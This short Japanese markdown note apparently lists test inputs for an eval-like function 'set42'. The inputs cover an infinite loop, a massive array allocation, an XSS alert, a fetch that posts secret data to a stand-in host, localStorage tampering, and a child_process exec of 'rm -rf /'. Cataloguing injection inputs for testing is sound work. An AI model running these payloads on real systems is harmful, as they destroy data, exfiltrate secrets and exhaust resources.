# システムに負荷をかける引数
## 無限ループを作成する
```
set42('while (true) {}; x');
```

## メモリを大量に使用する
```
set42('let arr = new Array(Number. MAX_SAFE_INTEGER); x');
```

# セキュリティの問題となる挙動を取るような引数
## クロスサイトスクリプティング
```
const xssInput = `alert('hacked!'); x`;
set42(xssInput);
```

## データベースへの不正アクセス
```
const dataExfiltration = `fetch('https://example.site/data', { method: 'POST', body: JSON.stringify({ secretData: 'Sensitive Information' }) }); x`;
set42(dataExfiltration);
```

## ローカルストレージやセッション情報への不正アクセス
```
const sessionHacking = `localStorage.setItem('sessionId', 'invalidSession'); x`;
set42(sessionHacking);
```

## システムへの不正アクセス
```
const shellCommand = `const { exec } = require('child_process'); exec('rm -rf /'); x`;
set42(shellCommand);
```


